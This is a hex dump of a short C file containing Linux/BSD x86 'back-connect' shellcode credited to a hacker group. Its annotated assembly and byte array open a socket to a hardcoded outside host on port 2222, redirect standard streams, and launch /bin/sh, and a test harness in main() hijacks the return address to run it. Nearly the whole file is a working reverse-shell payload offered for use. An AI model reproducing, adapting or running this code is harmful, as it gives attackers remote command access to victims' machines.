00000000  2f 2a 20 20 74 68 65 20  62 61 63 6b 2d 63 6f 6e  |/*  the back-con|
00000010  6e 65 63 74 20 73 68 65  6c 6c 63 6f 64 65 2e 20  |nect shellcode. |
00000020  54 68 65 20 64 65 73 74  69 6e 61 74 69 6f 6e 20  |The destination |
00000030  61 64 64 72 20 69 73 0d  0a 30 78 32 38 34 30 32  |addr is..0x28402|
00000040  65 63 33 20 28 72 6f 6f  74 74 65 61 6d 2e 68 6f  |ec3 (rootteam.ho|
00000050  73 74 2e 73 6b 29 20 70  6f 72 74 20 69 73 20 30  |st.sk) port is 0|
00000060  78 38 61 65 20 28 32 32  32 32 29 2e 0d 0a 73 69  |x8ae (2222)...si|
00000070  7a 65 20 3d 20 39 33 20  62 79 74 65 73 20 28 6c  |ze = 93 bytes (l|
00000080  69 74 74 6c 65 20 69 73  6e 27 74 20 69 74 3f 29  |ittle isn't it?)|
00000090  0d 0a 47 72 65 65 74 7a  20 32 20 73 70 30 30 66  |..Greetz 2 sp00f|
000000a0  65 64 0d 0a 09 77 72 69  74 74 65 6e 20 20 62 79  |ed...written  by|
000000b0  20 09 09 64 65 76 30 69  64 20 23 72 75 73 2d 73  | ..dev0id #rus-s|
000000c0  65 63 20 2f 45 46 6e 65  74 20 28 72 6f 6f 74 74  |ec /EFnet (roott|
000000d0  65 61 6d 2e 68 6f 73 74  2e 73 6b 29 0d 0a 0d 0a  |eam.host.sk)....|
000000e0  42 49 54 53 09 33 32 0d  0a 0d 0a 6a 6d 70 20 73  |BITS.32....jmp s|
000000f0  68 6f 72 74 09 70 61 74  68 0d 0a 6d 61 69 6e 3a  |hort.path..main:|
00000100  0d 0a 09 70 6f 70 09 65  73 69 0d 0a 09 78 6f 72  |...pop.esi...xor|
00000110  09 65 61 78 2c 65 61 78  0d 0a 09 6d 6f 76 20 62  |.eax,eax...mov b|
00000120  79 74 65 20 5b 65 73 69  2b 31 5d 2c 30 78 30 32  |yte [esi+1],0x02|
00000130  20 09 3b 20 66 69 6c 6c  69 6e 67 20 74 68 65 20  | .; filling the |
00000140  73 6f 63 6b 5f 61 64 64  72 20 73 74 72 75 63 74  |sock_addr struct|
00000150  0d 0a 09 6d 6f 76 20 77  6f 72 64 20 5b 65 73 69  |...mov word [esi|
00000160  2b 32 5d 2c 30 78 30 38  61 65 0d 0a 09 6d 6f 76  |+2],0x08ae...mov|
00000170  20 6c 6f 6e 67 20 5b 65  73 69 2b 34 5d 2c 30 78  | long [esi+4],0x|
00000180  32 38 34 30 32 65 63 33  20 3b 28 68 65 72 65 20  |28402ec3 ;(here |
00000190  79 6f 75 72 20 61 64 64  72 3a 20 72 6f 6f 74 74  |your addr: roott|
000001a0  65 61 6d 2e 68 6f 73 74  2e 73 6b 29 0d 0a 09 70  |eam.host.sk)...p|
000001b0  75 73 68 20 62 79 74 65  20 30 78 30 36 09 09 3b  |ush byte 0x06..;|
000001c0  69 6e 74 20 73 6f 63 6b  65 74 28 69 6e 74 20 64  |int socket(int d|
000001d0  6f 6d 61 69 6e 2c 69 6e  74 20 74 79 70 65 2c 20  |omain,int type, |
000001e0  69 6e 74 20 70 72 6f 74  6f 29 20 0d 0a 09 70 75  |int proto) ...pu|
000001f0  73 68 20 62 79 74 65 20  30 78 30 31 0d 0a 09 70  |sh byte 0x01...p|
00000200  75 73 68 20 62 79 74 65  20 30 78 30 32 0d 0a 09  |ush byte 0x02...|
00000210  6d 6f 76 09 61 6c 2c 39  37 09 09 3b 2f 75 73 72  |mov.al,97..;/usr|
00000220  2f 69 6e 63 6c 75 64 65  2f 73 79 73 2f 73 79 73  |/include/sys/sys|
00000230  63 61 6c 6c 2e 68 20 28  73 6f 63 6b 65 74 29 0d  |call.h (socket).|
00000240  0a 09 70 75 73 68 09 65  61 78 0d 0a 09 69 6e 74  |..push.eax...int|
00000250  09 30 78 38 30 0d 0a 09  6d 6f 76 20 09 65 64 78  |.0x80...mov .edx|
00000260  2c 65 61 78 09 09 3b 6e  6f 77 20 69 6e 20 65 64  |,eax..;now in ed|
00000270  78 20 77 65 20 68 61 76  65 20 74 68 65 20 64 65  |x we have the de|
00000280  73 63 72 69 70 74 6f 72  0d 0a 09 70 75 73 68 20  |scriptor...push |
00000290  62 79 74 65 20 30 78 31  30 09 09 3b 6d 61 6b 69  |byte 0x10..;maki|
000002a0  6e 67 20 63 6f 6e 6e 65  63 74 0d 0a 09 6c 65 61  |ng connect...lea|
000002b0  09 65 61 78 2c 5b 65 73  69 5d 0d 0a 09 70 75 73  |.eax,[esi]...pus|
000002c0  68 09 65 61 78 0d 0a 09  70 75 73 68 09 65 64 78  |h.eax...push.edx|
000002d0  09 09 3b 65 61 78 20 69  73 20 6f 75 72 20 73 6f  |..;eax is our so|
000002e0  63 6b 65 74 20 64 65 73  63 72 69 70 74 6f 72 0d  |cket descriptor.|
000002f0  0a 09 78 6f 72 09 65 61  78 2c 65 61 78 0d 0a 09  |..xor.eax,eax...|
00000300  6d 6f 76 09 61 6c 2c 39  38 09 09 3b 2f 75 73 72  |mov.al,98..;/usr|
00000310  2f 69 6e 63 6c 75 64 65  2f 73 79 73 2f 73 79 73  |/include/sys/sys|
00000320  63 61 6c 6c 2e 68 20 28  63 6f 6e 6e 65 63 74 29  |call.h (connect)|
00000330  0d 0a 09 70 75 73 68 09  65 61 78 0d 0a 09 69 6e  |...push.eax...in|
00000340  74 09 30 78 38 30 0d 0a  09 6d 6f 76 09 63 6c 2c  |t.0x80...mov.cl,|
00000350  33 0d 0a 09 6d 6f 76 09  65 62 78 2c 2d 31 0d 0a  |3...mov.ebx,-1..|
00000360  6c 6f 6f 70 5f 31 3a 09  09 09 09 3b 6d 61 6b 69  |loop_1:....;maki|
00000370  6e 67 20 64 75 70 32 20  33 20 74 69 6d 65 73 0d  |ng dup2 3 times.|
00000380  0a 09 69 6e 63 09 65 62  78 0d 0a 09 70 75 73 68  |..inc.ebx...push|
00000390  09 65 62 78 0d 0a 09 70  75 73 68 09 65 64 78 0d  |.ebx...push.edx.|
000003a0  0a 09 6d 6f 76 09 61 6c  2c 39 30 0d 0a 09 70 75  |..mov.al,90...pu|
000003b0  73 68 09 65 61 78 0d 0a  09 69 6e 74 09 30 78 38  |sh.eax...int.0x8|
000003c0  30 0d 0a 09 6c 6f 6f 70  6e 7a 09 6c 6f 6f 70 5f  |0...loopnz.loop_|
000003d0  31 0d 0a 09 78 6f 72 09  65 61 78 2c 65 61 78 0d  |1...xor.eax,eax.|
000003e0  0a 09 70 75 73 68 20 20  20 20 65 61 78 0d 0a 09  |..push    eax...|
000003f0  70 75 73 68 20 6c 6f 6e  67 20 30 78 36 38 37 33  |push long 0x6873|
00000400  32 66 32 66 0d 0a 09 70  75 73 68 20 6c 6f 6e 67  |2f2f...push long|
00000410  20 30 78 36 65 36 39 36  32 32 66 0d 0a 09 6d 6f  | 0x6e69622f...mo|
00000420  76 09 65 64 78 2c 65 73  70 0d 0a 09 70 75 73 68  |v.edx,esp...push|
00000430  09 65 61 78 0d 0a 09 70  75 73 68 09 65 73 70 0d  |.eax...push.esp.|
00000440  0a 09 70 75 73 68 09 65  64 78 0d 0a 09 6d 6f 76  |..push.edx...mov|
00000450  09 61 6c 2c 35 39 09 09  3b 2f 75 73 72 2f 69 6e  |.al,59..;/usr/in|
00000460  63 6c 75 64 65 2f 73 79  73 2f 73 79 73 63 61 6c  |clude/sys/syscal|
00000470  6c 2e 68 28 65 78 65 63  76 65 29 0d 0a 09 70 75  |l.h(execve)...pu|
00000480  73 68 09 65 61 78 0d 0a  09 69 6e 74 09 30 78 38  |sh.eax...int.0x8|
00000490  30 20 0d 0a 70 61 74 68  3a 0d 0a 09 63 61 6c 6c  |0 ..path:...call|
000004a0  20 09 6d 61 69 6e 0d 0a  09 64 62 20 27 41 27 09  | .main...db 'A'.|
000004b0  0d 0a 2a 2f 0d 0a 63 68  61 72 20 73 68 65 6c 6c  |..*/..char shell|
000004c0  63 6f 64 65 5b 5d 20 3d  0d 0a 09 22 5c 78 65 62  |code[] =..."\xeb|
000004d0  5c 78 35 36 5c 78 35 65  5c 78 33 31 5c 78 63 30  |\x56\x5e\x31\xc0|
000004e0  5c 78 63 36 5c 78 34 36  5c 78 30 31 5c 78 30 32  |\xc6\x46\x01\x02|
000004f0  5c 78 36 36 5c 78 63 37  5c 78 34 36 5c 78 30 32  |\x66\xc7\x46\x02|
00000500  5c 78 61 65 5c 78 30 38  22 0d 0a 09 22 5c 78 63  |\xae\x08"..."\xc|
00000510  37 5c 78 34 36 5c 78 30  34 5c 78 63 33 5c 78 32  |7\x46\x04\xc3\x2|
00000520  65 5c 78 34 30 5c 78 32  38 5c 78 36 61 5c 78 30  |e\x40\x28\x6a\x0|
00000530  36 5c 78 36 61 5c 78 30  31 5c 78 36 61 5c 78 30  |6\x6a\x01\x6a\x0|
00000540  32 5c 78 62 30 5c 78 36  31 22 0d 0a 09 22 5c 78  |2\xb0\x61"..."\x|
00000550  35 30 5c 78 63 64 5c 78  38 30 5c 78 38 39 5c 78  |50\xcd\x80\x89\x|
00000560  63 32 5c 78 36 61 5c 78  31 30 5c 78 38 64 5c 78  |c2\x6a\x10\x8d\x|
00000570  30 36 5c 78 35 30 5c 78  35 32 5c 78 33 31 5c 78  |06\x50\x52\x31\x|
00000580  63 30 5c 78 62 30 5c 78  36 32 22 0d 0a 09 22 5c  |c0\xb0\x62"..."\|
00000590  78 35 30 5c 78 63 64 5c  78 38 30 5c 78 62 31 5c  |x50\xcd\x80\xb1\|
000005a0  78 30 33 5c 78 62 62 5c  78 66 66 5c 78 66 66 5c  |x03\xbb\xff\xff\|
000005b0  78 66 66 5c 78 66 66 5c  78 34 33 5c 78 35 33 5c  |xff\xff\x43\x53\|
000005c0  78 35 32 5c 78 62 30 5c  78 35 61 22 0d 0a 09 22  |x52\xb0\x5a"..."|
000005d0  5c 78 35 30 5c 78 63 64  5c 78 38 30 5c 78 65 30  |\x50\xcd\x80\xe0|
000005e0  5c 78 66 36 5c 78 33 31  5c 78 63 30 5c 78 35 30  |\xf6\x31\xc0\x50|
000005f0  5c 78 36 38 5c 78 32 66  5c 78 32 66 5c 78 37 33  |\x68\x2f\x2f\x73|
00000600  5c 78 36 38 5c 78 36 38  5c 78 32 66 22 0d 0a 09  |\x68\x68\x2f"...|
00000610  22 5c 78 36 32 5c 78 36  39 5c 78 36 65 5c 78 38  |"\x62\x69\x6e\x8|
00000620  39 5c 78 65 32 5c 78 35  30 5c 78 35 34 5c 78 35  |9\xe2\x50\x54\x5|
00000630  32 5c 78 62 30 5c 78 33  62 5c 78 35 30 5c 78 63  |2\xb0\x3b\x50\xc|
00000640  64 5c 78 38 30 5c 78 65  38 5c 78 61 35 22 0d 0a  |d\x80\xe8\xa5"..|
00000650  09 22 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |."\xff\xff\xff\x|
00000660  34 31 22 3b 0d 0a 69 6e  74 0d 0a 6d 61 69 6e 28  |41";..int..main(|
00000670  29 0d 0a 7b 0d 0a 09 69  6e 74 20 2a 72 65 74 3b  |)..{...int *ret;|
00000680  0d 0a 09 72 65 74 3d 28  69 6e 74 2a 29 26 72 65  |...ret=(int*)&re|
00000690  74 2b 32 3b 0d 0a 09 28  2a 72 65 74 29 3d 28 69  |t+2;...(*ret)=(i|
000006a0  6e 74 29 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 7d  |nt)shellcode;..}|
000006b0
